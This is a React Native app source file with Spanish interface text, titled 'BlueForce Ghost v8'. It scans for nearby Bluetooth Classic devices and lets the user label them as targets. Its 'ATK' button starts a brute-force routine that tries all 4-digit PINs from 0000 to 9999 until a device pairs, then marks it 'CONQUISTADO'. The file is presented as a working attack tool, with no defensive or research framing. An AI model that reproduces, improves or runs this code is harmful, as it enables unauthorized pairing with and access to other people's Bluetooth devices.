import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator, Modal, TextInput } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

const SignalMeter = ({ rssi }) => {
  let s = 0; if (rssi > -45) s = 5; else if (rssi > -60) s = 4; else if (rssi > -75) s = 3; else if (rssi > -85) s = 2; else if (rssi > -100) s = 1;
  const c = s >= 4 ? '#00ff88' : s === 3 ? '#ffea00' : '#ff3c00';
  return (<View style={styles.mC}>{[1, 2, 3, 4, 5].map(b => <View key={b} style={[styles.b, { height: b * 3, backgroundColor: b <= s ? c : '#222' }]} />)}</View>);
};

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [history, setHistory] = useState({});
  const [aliases, setAliases] = useState({});
  const [mode, setMode] = useState('IDLE');
  const [currentPin, setCurrentPin] = useState('0000');
  const [logs, setLogs] = useState([]);
  const [isScanning, setIsScanning] = useState(false);
  
  // ESTADOS PARA RENOMBRAR (MODAL)
  const [modalVisible, setModalVisible] = useState(false);
  const [tempName, setTempName] = useState('');
  const [renamingAddr, setRenamingAddr] = useState('');

  const addLog = (msg) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 100));

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_ADVERTISE,
        ]);
      }
    })();
  }, []);

  const scan = async () => {
    if (isScanning || mode !== 'IDLE') return;
    setIsScanning(true); setDiscoveredDevices([]);
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a,b) => b.rssi - a.rssi));
    } catch (e) { addLog("❌ Error de comunicación."); }
    finally { setIsScanning(false); }
  };

  const startBruteForce = async (device) => {
    setMode('BRUTE');
    addLog(`🚀 ATK: ${device.address}`);
    RNBluetoothClassic.cancelDiscovery(); 

    for (let i = 0; i <= 9999; i++) {
        let m; setMode(c => { m = c; return c; }); if (m !== 'BRUTE') break;
        const pin = i.toString().padStart(4, '0');
        setCurrentPin(pin);
        try {
            await Promise.race([
                RNBluetoothClassic.pairDevice(device.address, { pin }),
                new Promise(r => setTimeout(r, 1500))
            ]);
            if (i % 5 === 0) {
                const bonded = await RNBluetoothClassic.getBondedDevices();
                if (bonded.some(d => d.address === device.address)) {
                    setHistory(prev => ({ ...prev, [device.address]: { status: '🔓 CONQUISTADO', pin } }));
                    setMode('IDLE'); Alert.alert("ÉXITO", `PIN: ${pin}`); return;
                }
            }
        } catch (e) {
            await new Promise(r => setTimeout(r, 600));
        }
    }
    setMode('IDLE');
  };

  const openRename = (addr, current) => {
    setRenamingAddr(addr);
    setTempName(current);
    setModalVisible(true);
  };

  const saveName = () => {
    if (tempName) setAliases(p => ({ ...p, [renamingAddr]: tempName.toUpperCase() }));
    setModalVisible(false);
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>BlueForce Ghost v8</Text>
      
      {/* VENTANA PARA RENOMBRAR */}
      <Modal visible={modalVisible} transparent={true} animationType="fade">
        <View style={styles.modalBg}>
          <View style={styles.modalBody}>
            <Text style={styles.modalTitle}>ASIGNAR ALIAS</Text>
            <TextInput 
                style={styles.input} 
                value={tempName} 
                onChangeText={setTempName} 
                placeholder="Nombre del objetivo..."
                placeholderTextColor="#666"
            />
            <View style={{flexDirection:'row', marginTop: 20}}>
                <TouchableOpacity style={[styles.mBtn, {backgroundColor:'#333'}]} onPress={() => setModalVisible(false)}>
                    <Text style={styles.bt}>CANCELAR</Text>
                </TouchableOpacity>
                <TouchableOpacity style={[styles.mBtn, {backgroundColor:'#00f2ff', marginLeft: 10}]} onPress={saveName}>
                    <Text style={[styles.bt, {color:'#000'}]}>GUARDAR</Text>
                </TouchableOpacity>
            </View>
          </View>
        </View>
      </Modal>

      <View style={styles.panel}>
        <Text style={styles.st}>MODO: {mode}</Text>
        <Text style={styles.pinText}>{mode === 'IDLE' ? 'READY' : currentPin}</Text>
        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={mode !== 'IDLE'}>
          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.scanText}>LOCALIZAR</Text>}
        </TouchableOpacity>
      </View>

      <FlatList data={discoveredDevices} renderItem={({ item }) => {
        const h = history[item.address] || { status: '⚪ NUEVO' };
        const name = aliases[item.address] || item.name || "DESCONOCIDO";
        const isC = h.status.includes('🔓');
        return (
          <View style={styles.card}>
            <SignalMeter rssi={item.rssi} />
            <TouchableOpacity style={{ flex: 1, marginLeft: 15 }} onPress={() => openRename(item.address, name)}>
              <Text style={styles.name}>{name}</Text>
              <Text style={styles.mac}>{item.address} | {h.status}</Text>
            </TouchableOpacity>
            <View style={{ flexDirection: 'row' }}>
              <TouchableOpacity style={styles.btn} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}>
                <Text style={styles.bt}>{isC ? 'RE-CON' : 'ATK'}</Text>
              </TouchableOpacity>
            </View>
          </View>
        );
      }} />
      <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.lt}>{l}</Text>)}</ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
  title: { color: '#00f2ff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  panel: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20, borderBottomWidth: 3, borderBottomColor: '#00f2ff' },
  st: { color: '#444', fontSize: 10, textAlign: 'center' },
  pinText: { color: '#fff', fontSize: 50, fontWeight: 'bold', textAlign: 'center', marginBottom: 10 },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
  scanText: { color: '#000', fontWeight: 'bold' },
  card: { backgroundColor: '#151a22', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold', fontSize: 13 },
  mac: { color: '#444', fontSize: 9 },
  mC: { flexDirection: 'row', alignItems: 'flex-end', width: 25 },
  b: { width: 3, marginRight: 2, borderRadius: 1 },
  btn: { backgroundColor: '#222', padding: 12, borderRadius: 8 },
  bt: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  logs: { height: 80, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
  lt: { color: '#333', fontSize: 8 },
  modalBg: { flex: 1, backgroundColor: 'rgba(0,0,0,0.8)', justifyContent: 'center', alignItems: 'center' },
  modalBody: { backgroundColor: '#111', padding: 25, borderRadius: 20, width: '80%', borderWith: 1, borderColor: '#333' },
  modalTitle: { color: '#00f2ff', fontWeight: 'bold', marginBottom: 15 },
  input: { backgroundColor: '#222', color: '#fff', padding: 10, borderRadius: 10 },
  mBtn: { padding: 12, borderRadius: 10, flex: 1, alignItems: 'center' }
});
